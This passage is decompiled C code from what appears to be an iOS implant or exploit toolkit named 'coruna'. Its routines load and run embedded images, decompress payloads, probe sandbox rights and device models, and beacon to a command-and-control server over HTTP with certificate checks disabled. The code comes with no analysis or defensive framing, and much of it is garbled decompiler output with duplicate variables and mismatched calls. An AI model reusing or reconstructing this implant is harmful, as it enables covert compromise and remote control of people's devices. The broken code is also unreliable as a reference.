  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_svc_indirect_2(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_svc_indirect_3(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_svc_indirect_4(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}
void coruna_dyld_register_image(long handle,int flags,int *count_2,uint size)
{
  int *err;
  long handle;
  uint u;
  int err;
  uint size;
  int status;
  unsigned long version;
  long addr;
  uint64_t port;
  
  if ((((handle != 0) && (count_2 != (int *)0x0)) && (size != 0)) && (3 < size)) {
    if (*count_2 == -0xff24111) {
      if ((8 < size) && (size = count_2[1], 0 < (int)size)) {
        version = 0;
        while (err = count_2 + version * 4 + 2,
              count_2 <= err && err < (int *)((long)count_2 + (unsigned long)size)) {
          port = *(uint64_t *)err;
          status = (int)port;
          if (status == 0) {
            return;
          }
          addr = 0;
          u = err[2];
          err = err[3];
          while (handle = handle + addr,
                *(int *)(handle + 0x140) != 0 && *(int *)(handle + 0x140) != status) {
            addr = addr + 0x30;
            if (addr == 0x480) {
              return;
            }
          }
          *(uint64_t *)(handle + 0x148) = 0;
          *(uint64_t *)(handle + 0x140) = 0;
          *(uint64_t *)(handle + 0x158) = 0;
          *(uint64_t *)(handle + 0x150) = 0;
          *(uint64_t *)(handle + 0x168) = 0;
          *(uint64_t *)(handle + 0x160) = 0;
          *(uint64_t *)(handle + 0x140) = port;
          *(unsigned long *)(handle + 0x148) = (unsigned long)u + (long)count_2;
          version = version + 1;
          *(int *)(handle + 0x150) = err;
          if (version == size) {
            return;
          }
        }
      }
    }
    else if (flags != 0) {
      addr = 0;
      do {
        handle = handle + addr;
        if (*(int *)(handle + 0x140) == 0 || *(int *)(handle + 0x140) == flags) {
          *(uint64_t *)(handle + 0x148) = 0;
          *(uint64_t *)(handle + 0x140) = 0;
          *(uint64_t *)(handle + 0x158) = 0;
          *(uint64_t *)(handle + 0x150) = 0;
          *(uint64_t *)(handle + 0x168) = 0;
          *(uint64_t *)(handle + 0x160) = 0;
          *(int *)(handle + 0x140) = flags;
          *(uint32_t *)(handle + 0x144) = 1;
          *(int **)(handle + 0x148) = count_2;
          *(uint *)(handle + 0x150) = size;
          return;
        }
        addr = addr + 0x30;
      } while (addr != 0x480);
    }
  }
  return;
}
void coruna_ctx_slot_clear(long handle)
{
  long handle;
  long addr;
  uint64_t scratch;
  
  addr = 0;
  while (((*(int *)(handle + addr + 0x140) == 0 || (*(int *)(handle + addr + 0x144) == 0)) ||
         (handle = handle + addr, *(long *)(handle + 0x168) != 0))) {
    addr = addr + 0x30;
    if (addr == 0x480) {
      return;
    }
  }
  scratch = 0;
  coruna_loader_run(*(uint64_t *)(handle + 0x30),handle,*(uint64_t *)(handle + 0x148),
               *(uint32_t *)(handle + 0x150),&scratch);
  return;
}
void coruna_ctx_bind_image(long handle,int flags)
{
  int err;
  long handle;
  long addr;
  uint64_t scratch;
  
  if ((handle != 0) && (*(long *)(handle + 0x30) != 0 && flags != 0)) {
    addr = 0;
    do {
      if (*(int *)(handle + addr + 0x140) == flags) {
        if (*(long *)(handle + addr + 0x168) != 0) {
          return;
        }
        handle = *(long *)(handle + addr + 0x148);
        if (handle == 0) {
          return;
        }
        err = *(int *)(handle + addr + 0x150);
        if (err == 0) {
          return;
        }
        scratch = 0;
        coruna_loader_run(handle,handle,err,&scratch);
        return;
      }
      addr = addr + 0x30;
    } while (addr != 0x480);
  }
  return;
}
void coruna_ctx_unbind_image(long handle,int flags)
{
  long handle;
  long addr;
  
  if ((handle != 0) && (*(long *)(handle + 0x130) != 0 && flags != 0)) {
    addr = 0;
    do {
      handle = handle + addr;
      if (*(int *)(handle + 0x140) == flags) {
        if (*(long *)(handle + 0x168) == 0) {
          *(uint64_t *)(handle + 0x168) = 0;
          *(uint64_t *)(handle + addr + 0x158) = 0;
          *(uint32_t *)(handle + addr + 0x160) = 0;
          return;
        }
        coruna_loader_run(handle);
        return;
      }
      addr = addr + 0x30;
    } while (addr != 0x480);
  }
  return;
}
void coruna_ctx_find_by_version(long handle,int flags,long *addr_2)
{
  long handle;
  int err;
  long addr;
  
  if (((handle != 0) && (addr_2 != (long *)0x0)) && (*addr_2 = 0, flags != 0)) {
    addr = 0;
    do {
      handle = handle + addr;
      if (*(int *)(handle + 0x140) == flags) {
        addr = *(long *)(handle + 0x168);
        if (addr == 0) {
          err = coruna_ctx_bind_image();
          if (err != 0) {
            return;
          }
          addr = *(long *)(handle + 0x168);
        }
        *addr_2 = addr;
        return;
      }
      addr = addr + 0x30;
    } while (addr != 0x480);
  }
  return;
}
void coruna_ctx_get_image_ptr(long handle,int flags,long *addr_2,int *count_2)
{
  int err;
  long handle;
  long addr;
  
  if (((handle != 0) && (addr_2 != (long *)0x0)) && (count_2 != (int *)0x0)) {
    *addr_2 = 0;
    *count_2 = 0;
    if (flags != 0) {
      handle = 0;
      while (*(int *)(handle + handle + 0x140) != flags) {
        handle = handle + 0x30;
        if (handle == 0x480) {
          return;
        }
      }
      addr = *(long *)(handle + handle + 0x148);
      if ((addr == 0) || (err = *(int *)(handle + handle + 0x150), err == 0)) {
        return;
      }
      *addr_2 = addr;
      *count_2 = err;
    }
  }
  return;
}
void coruna_ctx_clear_slots(long ctx)
{
  uint64_t *ptr;
  long handle;
  
  handle = 0x140;
  do {
    ptr = (uint64_t *)(ctx + handle);
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[1] = 0;
    *ptr = 0;
    handle = handle + 0x30;
  } while (handle != 0x5c0);
  *(void (**)(ctx + 0xe8) = coruna_dyld_register_image;
  *(void (**)(ctx + 0xf0) = coruna_ctx_slot_clear;
  *(void (**)(ctx + 0xf8) = coruna_ctx_bind_image;
  *(void (**)(ctx + 0x100) = coruna_ctx_unbind_image;
  *(void (**)(ctx + 0x108) = coruna_ctx_find_by_version;
  *(void (**)(ctx + 0x110) = coruna_ctx_get_image_ptr;
  return;
}
void coruna_proc_vm_region(long ctx)
{
  long handle;
  pid_t pid;
  int err;
  kern_return_t lk3;
  uint *ptr;
  mach_port_t scratch;
  mach_msg_type_number_t bootargs;
  int thread_attr [20];
  vm_address_t host_info;
  unsigned long scratch;
  vm_size_t serial_buf;
  vm_address_t action;
  
  if (((*(char *)(ctx + 0x5c2) == '\0') && (*(char *)(ctx + 0x5c5) == '\0')) &&
     (*(char *)(ctx + 0x5c7) == '\0')) {
    if (*(uint *)(ctx + 0xc0) < 0xf0000) {
      action = *(vm_address_t *)(ctx + 0x48);
      serial_buf = 0;
      bootargs = 9;
      lk3 = _vm_region_64(*(vm_map_t *)k_bootstrap_mach_task_self_slot,&action,&serial_buf,9,
                            thread_attr,&bootargs,&scratch);
      if (lk3 != 0) {
        return;
      }
    }
    else {
      pid = _getpid();
      err = _proc_pidinfo(pid,7,*(uint64_t *)(ctx + 0x48),thread_attr,0x60);
      if (err < 1) {
        return;
      }
      serial_buf = scratch;
      action = host_info;
    }
    if ((*(long *)(ctx + 0x5d8) == 0) && (thread_attr[0] != 7)) {
      return;
    }
    if (action == 0) {
      return;
    }
    if (serial_buf == 0) {
      return;
    }
    handle = action + (serial_buf >> 1);
    ptr = (uint *)(handle + -4);
    if (serial_buf >> 1 < (unsigned long)*ptr) {
      return;
    }
    *(uint **)(ctx + 0x138) = ptr;
    *(long *)(ctx + 0x88) = handle;
    err = (int)(serial_buf >> 1) + -0x100000;
    if (*(char *)(ctx + 0x5c3) != '\0') {
      err = (int)(serial_buf >> 2);
    }
    *(int *)(ctx + 0x90) = err;
    *(void (**)(ctx + 0x128) = coruna_heap_alloc_pages;
  }
  *(void (**)(ctx + 0x120) = coruna_flush_caches;
  if ((*(char *)(ctx + 0x5c5) == '\0') && (*(char *)(ctx + 0x5c7) == '\0')) {
    *(uint32_t *)(ctx + 0x50) = 0;
  }
  return;
}
void coruna_lzfse_decode(uint64_t *dst,uint *src)
{
  uint u;
  uint size;
  void *ptr;
  unsigned long version;
  int *err;
  unsigned long port;
  
  if ((((dst != (uint64_t *)0x0) &&
       (err = (int *)*dst, err != (int *)0x0 && src != (uint *)0x0)) &&
      (u = *src, u != 0)) && ((7 < u && (*err == 0xbedf00d)))) {
    size = err[1];
    port = (unsigned long)size;
    if ((size != 0) && (u - 8 < size)) {
      ptr = _malloc(port + 1);
      if (ptr != (void *)0x0) {
        _memset_s(ptr,port,0,port);
        version = _compression_decode_buffer(ptr,port + 1,err + 2,u - 8,0,0x306);
        if (version == port) {
          _memset_s(err,u,0,u);
          _free(err);
          *dst = ptr;
          *src = size;
        }
        else {
          _memset_s(ptr,port,0,port);
          _free(ptr);
        }
      }
    }
  }
  return;
}





void coruna_loader_invoke_noret(long handle,uint64_t val)
{
  uint32_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  coruna_loader_run(*(uint64_t *)(handle + 0x110),handle,val,&bootargs,&scratch);
  return;
}
void coruna_strlen(uint64_t val,uint64_t id_2)
{
  coruna_loader_invoke_noret(val,0x90000,id_2);
  return;
}
void coruna_loader_call_ctx(long handle,uint64_t val,long addr_2)
{
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(handle + 8) != 0)) {
    coruna_loader_run(*(uint64_t *)(*(long *)(handle + 8) + 0x18));
    return;
  }
  return;
}
void coruna_loader_call_self(long handle,long addr_2)
{
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(handle + 8) != 0)) {
    coruna_loader_run(*(long *)(handle + 8));
    return;
  }
  return;
}
void coruna_loader_call_child(long handle,long addr_2)
{
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(handle + 8) != 0)) {
    coruna_loader_run(*(long *)(handle + 8));
    return;
  }
  return;
}
void coruna_loader_call_nested(long handle,long addr_2)
{
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(addr_2 + 8) != 0)) {
    coruna_loader_run(*(uint64_t *)(*(long *)(addr_2 + 8) + 0x10));
    return;
  }
  return;
}
void coruna_iokit_open_service(long handle,long addr_2)
{
  uint u;
  pid_t lp2;
  int err;
  unsigned long size;
  char *ptr;
  uint32_t version;
  bool err;
  
  if (handle == 0) {
    return;
  }
  if (addr_2 == 0) {
    return;
  }
  size = coruna_sysctl_hw_model(handle);
  if ((size & 1) == 0) {
    u = *(uint *)(handle + 0xc0);
    if ((u < 0x100501) && (0xf8f8 < u - 0xf0707)) {
      if (u < 0x100000) goto fail;
      lp2 = _getpid();
      version = *(uint32_t *)k_bootstrap_sandbox_check_no_report_slot;
      ptr = "iokit-open-service";
    }
    else {
      lp2 = _getpid();
      ptr = (char *)0x0;
      version = 0;
    }
    err = _sandbox_check(lp2,ptr,version);
    err = 0 < err;
  }
  else {
fail:
    err = false;
  }
  *(bool *)addr_2 = err;
  return;
}
void coruna_is_mobilestore_ua(long handle)
{
  bool err;
  int err;
  uint8_t scratch;
  
  if (handle != 0) {
    scratch = 0;
    err = coruna_iokit_open_service(handle,&scratch);
    if (err == 0) {
      *(uint8_t *)(handle + 0x5e8) = scratch;
      if (*(char **)(handle + 0xa0) == (char *)0x0) {
        err = false;
      }
      else {
        err = _strncasecmp("MobileStore/1.0",*(char **)(handle + 0xa0),0xf);
        err = err == 0;
      }
      *(bool *)(handle + 0x5ec) = err;
    }
  }
  return;
}
void coruna_c2_http(char *ctx,long url,long handle,char *path,uint64_t *val,
                 uint *size)
{
  char *ptr;
  bool err;
  bool status;
  int err;
  uint u;
  long handle;
  long addr;
  long off;
  size_t ls9;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  long serial_8;
  long serial_9;
  long *ptr;
  uint64_t size;
  void *buf;
  void *str;
  long *copy;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  uint64_t type_id_10;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  long *stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t sa_saved;
  uint64_t sa_new[2];
  
  action = 0;
  err = val == (uint64_t *)0x0;
  status = size == (uint *)0x0;
  if (ctx == (char *)0x0) {
    return;
  }
  if (*ctx == '\0') {
    return;
  }
  if ((err || status) && (val != (uint64_t *)0x0 || size != (uint *)0x0)) {
    return;
  }
  type_id_10 = *(uint64_t *)k_bootstrap_kcfallocatordefault_slot;
  handle = _CFStringCreateWithCString(type_id_10,ctx,0x8000100);
  if (handle == 0) goto fail;
  addr = _CFStringGetLength();
  off = handle;
  if (0 < addr) {
    addr = 0;
    if (url == 0) {
done:
      if (handle == 0) {
        scratch = 0;
cleanup:
        if (path == (char *)0x0) {
          off = 0;
check_ok:
          u = 0;
          copy = &action;
          if (err || status) {
            copy = (long *)0x0;
          }
          ptr = "GET";
          if (off != 0) {
            ptr = "POST";
          }
          version = *(uint64_t *)k_bootstrap_kcfhttpversion1_1_slot;
          port = *(uint64_t *)k_bootstrap_kcfstreamsslvalidatescertificatechain_slot;
          tag = *(uint64_t *)k_bootstrap_kcfbooleanfalse_slot;
          kind = *(uint64_t *)k_bootstrap_kcfstreampropertysslsettings_slot;
          type_id = *(uint64_t *)k_bootstrap_kcfstreampropertyhttpproxy_slot;
          type_id_8 = *(uint64_t *)k_bootstrap_kcfrunloopcommonmodes_slot;
          type_id_9 = *(uint64_t *)k_bootstrap_kcfrunloopdefaultmode_slot;
          do {
            if (!err && !status) {
              *copy = 0;
            }
            base = _CFURLCreateWithString(type_id_10,handle,0);
            if (base == 0) {
              if (6 < u) goto skip;
            }
            else {
              ctx_val = _CFURLCopyScheme();
              if (ctx_val == 0) {
                err = 0x300d;
                serial = base;
next:
                _CFRelease(serial);
              }
              else {
                serial = _CFStringCreateWithCString(type_id_10,ptr,0x8000100);
                err = 0xad009;
                if (serial == 0) {
retry:
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                  if (serial != 0) goto next;
                }
                else {
                  serial_7 = _CFHTTPMessageCreateRequest(type_id_10,serial,base,version);
                  if (serial_7 == 0) {
                    err = 0x3009;
                    goto retry;
                  }
                  if (off != 0) {
                    _CFHTTPMessageSetBody(serial_7);
                  }
                  if (addr == 0) {
                    serial_buf = 0;
found:
                    if (scratch == 0) {
                      host_info = 0;
                    }
                    else {
                      host_info = _CFStringCreateWithCString(type_id_10,"Content-Type",0x8000100);
                      if (host_info == 0) goto nomem;
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,host_info,scratch);
                    }
                    serial_8 = _CFReadStreamCreateForHTTPRequest(type_id_10,serial_7);
                    if (serial_8 == 0) {
                      bootargs = 0;
                      thread_attr = 0;
                      err = 0x300a;
                    }
                    else {
                      thread_attr = _CFStringCreateWithCString(type_id_10,"https",0x8000100);
                      if (thread_attr == 0) {
                        bootargs = 0;
                        err = 0xad009;
                      }
                      else {
                        err = _CFEqual(thread_attr,ctx_val);
                        if (err == 0) {
invalid:
                          serial_9 = _SCDynamicStoreCopyProxies(0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300e;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,type_id,serial_9);
                            _CFRelease(serial_9);
                            if (err == 0) goto again;
                            serial_9 = _CFHTTPMessageCreateEmpty(type_id_10,0);
                            if (serial_9 == 0) {
                              bootargs = 0;
                              err = 0x3009;
                            }
                            else {
                              ptr = _calloc(0x10,1);
                              if (ptr == (long *)0x0) {
                                bootargs = 0;
                                err = 0xad009;
                              }
                              else {
                                *ptr = serial_9;
                                *(uint32_t *)((long)ptr + 0xc) = 500;
                                block_ctx = 0;
                                bootargs = 0;
                                scratch = 0;
                                sa_saved = 0;
                                stack_guard = ptr;
                                size = coruna_get_cpu_capabilities(coruna_c2_http_client);
                                size = coruna_return_zero_gate(size,0);
                                err = _CFReadStreamSetClient(serial_8,0x1a,size,&block_ctx);
                                if (err == 0) {
                                  bootargs = 0;
                                  err = 0x3010;
                                }
                                else {
                                  size = _CFRunLoopGetCurrent();
                                  _CFReadStreamScheduleWithRunLoop(serial_8,size,type_id_8);
                                  err = _CFReadStreamOpen(serial_8);
                                  if (err == 0) {
                                    bootargs = 0;
                                    err = 0x300b;
                                  }
                                  else {
                                    _CFRunLoopRunInMode(0x406e000000000000,type_id_9,0);
                                    _CFReadStreamClose(serial_8);
                                    err = (int)ptr[1];
                                    if (err == 0) {
                                      err = 0x3011;
                                      if (*(uint *)((long)ptr + 0xc) < 400) {
                                        err = 0;
                                      }
                                      if (*(uint *)((long)ptr + 0xc) < 400 && (!err && !status)
                                         ) {
                                        bootargs = _CFHTTPMessageCopyBody(*ptr);
                                        if (bootargs == 0) {
                                          bootargs = 0;
                                          err = 0x3019;
                                        }
                                        else {
                                          err = 0;
                                          *copy = bootargs;
                                        }
                                        goto exit_ok;
                                      }
                                    }
                                    bootargs = 0;
                                  }
                                }
exit_ok:
                                _free(ptr);
                              }
                              _CFRelease(serial_9);
                            }
                          }
                        }
                        else {
                          block_ctx = port;
                          sa_new[0] = tag;
                          serial_9 = _CFDictionaryCreate(type_id_10,&block_ctx,sa_new,1,0,0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300f;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,kind,serial_9);
                            _CFRelease(serial_9);
                            if (err != 0) goto invalid;
again:
                            bootargs = 0;
                            err = 0x300c;
                          }
                        }
                      }
                      _CFRelease(serial_8);
                    }
                  }
                  else {
                    serial_buf = _CFStringCreateWithCString(type_id_10,"User-Agent",0x8000100);
                    if (serial_buf != 0) {
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,serial_buf,addr);
                      goto found;
                    }
                    serial_buf = 0;
nomem:
                    bootargs = 0;
                    thread_attr = 0;
                    host_info = 0;
                    err = 0xad009;
                  }
                  _CFRelease(serial_7);
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                  _CFRelease(serial);
                  if (serial_buf != 0) {
                    _CFRelease();
                  }
                  if (host_info != 0) {
                    _CFRelease();
                  }
                  if (thread_attr != 0) {
                    _CFRelease();
                  }
                  if ((bootargs != 0) && (serial = bootargs, err != 0)) goto next;
                }
              }
              base = action;
              if ((6 < u) || (err == 0)) goto parse_ok;
            }
            u = u + 1;
          } while( true );
        }
        ls9 = _strlen(path);
        off = _CFDataCreate(type_id_10,path,ls9);
        if (off != 0) goto check_ok;
      }
      else {
        scratch = _CFStringCreateWithCString(type_id_10,handle,0x8000100);
        if (scratch == 0) {
          scratch = 0;
          off = 0;
          goto skip;
        }
        off = _CFStringGetLength();
        if (0 < off) goto cleanup;
      }
      off = 0;
      goto skip;
    }
    addr = _CFStringCreateWithCString(type_id_10,url,0x8000100);
    if (addr != 0) {
      off = _CFStringGetLength();
      if (0 < off) goto done;
      _CFRelease(handle);
      off = 0;
      scratch = 0;
      goto load_ok;
    }
  }
load_ok_15:
  _CFRelease(off);
fail:
  if (action != 0) {
    _CFRelease();
  }
  return;
parse_ok:
  if ((err == 0 && (!err && !status)) &&
     (((action != 0 && (u = _CFDataGetLength(action), u != 0)) &&
      (buf = (void *)_CFDataGetBytePtr(base), buf != (void *)0x0)))) {
    str = _malloc((unsigned long)u);
    if (str != (void *)0x0) {
      _memcpy(str,buf,(unsigned long)u);
      *val = str;
      *size = u;
    }
  }
skip:
  _CFRelease(handle);
  if (addr != 0) {
load_ok:
    _CFRelease(addr);
  }
  if (scratch != 0) {
    _CFRelease(scratch);
  }
  if (off == 0) goto fail;
  goto load_ok_15;
}
void coruna_c2_dispatch(long handle,char *path,long addr_2,long off_3)
{
  if (((handle != 0) && (path != (char *)0x0)) &&
     ((*path != '\0' && addr_2 != 0) && off_3 != 0)) {
    if (*(long *)(handle + 0x5e0) == 0) {
      coruna_c2_http(path,*(uint64_t *)(handle + 0xa0),0,0,addr_2,off_3);
    }
    else {
      coruna_semaphore_wait_signal(handle,path,0,&k_bootstrap_semaphore_wait_word);
    }
  }
  return;
}
void coruna_c2_json_http(char *ctx,uint64_t url,uint64_t val,uint64_t id_2,
                 uint64_t size_3)
{
  int err;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if ((((ctx != (char *)0x0) && (*ctx != '\0')) &&
      ((err = _strncmp(ctx,"http://",7), err == 0 ||
       (err = _strncmp(ctx,"https://",8), err == 0)))) &&
     (err = coruna_c2_json_body(val,id_2,size_3,&bootargs,&scratch), err == 0)) {
    coruna_c2_http(ctx,url,"application/json",bootargs,0,0);
    _bzero(bootargs,(unsigned long)scratch);
    _free(bootargs);
  }
  return;
}
void coruna_c2_json_body(uint64_t val,long handle,uint64_t id_2,uint64_t size_3,
                 uint64_t off_4)
{
  int err;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if (handle == 0) {
    ptr = "{\\\"e\\\":%u,\\\"l\\\":%u}";
  }
  else {
    ptr = "{\\\"e\\\":%u,\\\"f\\\":\\\"%s\\\",\\\"l\\\":%u}";
  }
  err = coruna_c2_sprintf(&bootargs,&scratch,ptr);
  if (err == 0) {
    coruna_c2_sprintf(size_3,off_4,"{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}");
    _bzero(bootargs,(unsigned long)scratch);
    _free(bootargs);
  }
  return;
}
void coruna_c2_json_dispatch(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  char *ptr;
  uint scratch;
  void *bootargs;
  uint thread_attr;
  void *host_info;
  
  if (handle != 0) {
    if (*(long *)(handle + 0x5e0) == 0) {
      coruna_c2_json_http(*(uint64_t *)(handle + 0xa8),*(uint64_t *)(handle + 0xa0),val,id_2,
                   size_3);
    }
    else {
      host_info = (void *)0x0;
      thread_attr = 0;
      bootargs = (void *)0x0;
      scratch = 0;
      ptr = *(char **)(handle + 0xa8);
      if ((((ptr != (char *)0x0) && (*ptr != '\0')) &&
          ((err = _strncmp(ptr,"http://",7), err == 0 ||
           (err = _strncmp(ptr,"https://",8), err == 0)))) &&
         (err = coruna_c2_json_body(val,id_2,size_3,&bootargs,&scratch), err == 0)) {
        err = coruna_semaphore_wait_signal(handle,*(uint64_t *)(handle + 0xa8),bootargs,&k_bootstrap_semaphore_signal_word,
                             &host_info,&thread_attr);
        if (err == 0) {
          _bzero(host_info,(unsigned long)thread_attr);
          _free(host_info);
          host_info = (void *)0x0;
        }
        _bzero(bootargs,(unsigned long)scratch);
        _free(bootargs);
      }
    }
  }
  return;
}
void coruna_semaphore_create(long handle)
{
  if (handle != 0) {
    *(void (**)(handle + 0x40) = coruna_c2_dispatch;
    *(void (**)(handle + 0x5f0) = coruna_c2_json_dispatch;
    if (*(long *)(handle + 0x5e0) != 0) {
      _semaphore_create(*(task_t *)k_bootstrap_mach_task_self_slot,(semaphore_t *)(handle + 0x5f8),0,
                        1);
    }
  }
  return;
}
void coruna_c2_http_client(long handle,unsigned long arg,uint64_t *val)
{
  int err;
  uint32_t u;
  long handle;
  uint8_t scratch[4096];
  
  if ((handle != 0) && (val != (uint64_t *)0x0)) {
    if ((long)arg < 4) {
      if (arg < 2) {
        return;
      }
      if (arg == 2) {
        handle = _CFReadStreamRead(handle,scratch,0x1000);
        if (handle < 1) {
          return;
        }
        err = _CFHTTPMessageAppendBytes(*val,scratch,handle);
        if (err != 0) {
          return;
        }
      }
    }
    else {
      if (arg == 4) {
        return;
      }
      if (arg == 8) {
        *(uint32_t *)(val + 1) = 0x3008;
      }
      else if ((arg == 0x10) &&
              (handle = _CFReadStreamCopyProperty
                                 (handle,*(uint64_t *)
                                           k_bootstrap_kcfstreampropertyhttpresponseheader_slot),
              handle != 0)) {
        u = _CFHTTPMessageGetResponseStatusCode();
        *(uint32_t *)((long)val + 0xc) = u;
        _CFRelease(handle);
      }
    }
  }
  _CFRunLoopGetCurrent();
  _CFRunLoopStop();
  return;
}
void coruna_semaphore_wait_signal(long handle,char *path,char *str_2,long addr_2,uint64_t *val,
                 uint *size)
{
  int err;
  uint u;
  kern_return_t lk3;
  void *ptr;
  uint32_t *ptr;
  uint32_t size;
  int *err;
  long handle;
  
  if ((val != (uint64_t *)0x0) && (size != (uint *)0x0)) {
    *val = 0;
    *size = 0;
    lk3 = _semaphore_wait(*(semaphore_t *)(handle + 0x5f8));
    if (lk3 == 0) {
      handle = addr_2;
      if (addr_2 != 0) {
        do {
          err = **(int **)(handle + 0x5e0);
          if (err == 0) {
            _strncpy((char *)(*(int **)(handle + 0x5e0) + 1),path,0x7ffffc);
            *(uint8_t *)(*(long *)(handle + 0x5e0) + 0x7fffff) = 0;
            ptr = *(uint32_t **)(handle + 0x5e0);
            if (str_2 == (char *)0x0) {
              size = 1;
            }
            else {
              _strncpy((char *)(ptr + 0x200000),str_2,0x800000);
              *(uint8_t *)(*(long *)(handle + 0x5e0) + 0xffffff) = 0;
              ptr = *(uint32_t **)(handle + 0x5e0);
              size = 7;
            }
            *ptr = size;
            break;
          }
          if (err == 5) break;
          _thread_switch(0,2,1);
          handle = handle + -1;
        } while (handle != 0);
        do {
          err = *(int **)(handle + 0x5e0);
          err = *err;
          if (err - 3U < 2) {
            *err = 0;
            if (err == 3) {
              u = err[1];
              if ((u != 0) && (ptr = _malloc((unsigned long)u), ptr != (void *)0x0)) {
                _memcpy(ptr,err + 2,(unsigned long)u);
                *val = ptr;
                *size = u;
              }
            }
            goto fail;
          }
          _thread_switch(0,2,1);
          addr_2 = addr_2 + -1;
        } while (addr_2 != 0);
      }
      **(uint32_t **)(handle + 0x5e0) = 0;
fail:
      _semaphore_signal(*(semaphore_t *)(handle + 0x5f8));
    }
  }
  return;
}
void coruna_c2_sprintf(uint64_t *val,int *flags,char *path)
{
  uint u;
  int err;
  char *ptr;
  unsigned long size;
  
  if (((val != (uint64_t *)0x0) && (flags != (int *)0x0)) && (path != (char *)0x0)) {
    u = _vsnprintf((char *)0x0,0,path,&ghidra_stack_0);
    if ((int)u < 1) {
      ptr = (char *)0x0;
      err = 0;
    }
    else {
      size = (unsigned long)(u + 1);
      ptr = _malloc(size);
      if (ptr == (char *)0x0) {
        err = 0;
      }
      else {
        err = _vsnprintf(ptr,size,path,&ghidra_stack_0);
        if ((int)u < err) {
          _bzero(ptr,size);
          _free(ptr);
          ptr = (char *)0x0;
          err = 0;
        }
        else {
          ptr[u] = '\0';
        }
      }
    }
    *val = ptr;
    *flags = err;
  }
  return;
}
void coruna_sysctl_hw_model(long handle)
{
  uint u;
  size_t scratch [5];
  
  if ((((handle != 0) && (u = *(uint *)(handle + 0xc0), u < 0x100700)) &&
      (u < 0x100401)) && ((0xf8f8 < u - 0xf0707 && (u - 0xf0200 >> 9 < 0x7f)))) {
    scratch[2] = 0;
    scratch[1] = 0;
    scratch[4] = 0;
    scratch[3] = 0;
    scratch[0] = 0x20;
    _sysctlbyname("hw.model",scratch + 1,scratch,(void *)0x0,0);
  }
  return;
}
void coruna_uname(long handle,long addr_2,uint64_t val,long off_3,long ctx_4,
                 long ctx_5)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  int err;
  uint kind;
  uint type_id;
  uint type_id_8;
  utsname scratch;
  
  if (handle == 0) {
    return;
  }
  if (addr_2 == 0) {
    return;
  }
  if ((int)val == 0) {
    return;
  }
  if (off_3 == 0) {
    return;
  }
  if (ctx_4 == 0) {
    return;
  }
  if (ctx_5 == 0) {
    return;
  }
  tag = coruna_hw_model_probe(handle);
  if (tag == 0) {
    kind = 0;
    goto fail;
  }
  version = *(uint *)(handle + 0xdc);
  kind = *(uint *)(handle + 0xc0);
  if (kind < 0xf0600) {
    if (kind < 0xf0000) {
      if (kind < 0xe0802) {
        if (kind < 0xd0000) {
          kind = 0;
          tag = 0;
        }
        else {
          type_id = kind >> 8 & 0xf00;
          u = kind >> 4 & 0xf0;
          type_id_8 = 0;
          if (0x4f < u) {
            type_id_8 = 0x50;
          }
          port = 0x70;
          if (u < 0x70) {
            port = type_id_8;
          }
          type_id_8 = 0x70;
          if ((kind & 0xf) != 0) {
            type_id_8 = u;
          }
          size = 0;
          if (0x7f < u) {
            size = kind & 0xf;
            port = type_id_8;
          }
          u = 0;
          if (0xdff < type_id) {
            u = port;
          }
          kind = 0;
          if (0xdff < type_id) {
            kind = size;
          }
          type_id_8 = 0x11000000;
          if (version < 2) {
            type_id_8 = 0x10000000;
          }
          kind = type_id | type_id_8 | u | kind;
        }
        goto fail;
      }
    }
    else {
      _bzero(&scratch,0x500);
      err = _uname(&scratch);
      if ((err == 0) &&
         (scratch.machine == 0x6f685069 && scratch.machine == 0x656e)) {
        type_id = 0x13000000;
        if (version < 2) {
          type_id = 0x12000000;
        }
        kind = kind >> 8 & 0xf00 | type_id | (uint)((kind & 0xe00) != 0) << 5;
        goto fail;
      }
    }
  }
  kind = 0xe2000000;
  if (version < 2) {
    kind = 0x2000000;
  }
fail:
  err = coruna_join_path(handle,tag | kind,addr_2,val,off_3,ctx_4,ctx_5);
  if (err == 0x30001) {
    tag = coruna_hw_model_probe(handle);
    if (tag == 0) {
      kind = 0;
    }
    else if ((*(byte *)(handle + 0xdb) & 1) == 0) {
      kind = 0x1000000;
    }
    else {
      kind = 0xe2000000;
      if (*(uint *)(handle + 0xdc) < 2) {
        kind = 0x2000000;
      }
    }
    coruna_join_path(handle,kind | tag,addr_2,val,off_3,ctx_4,ctx_5);
  }
  return;
}
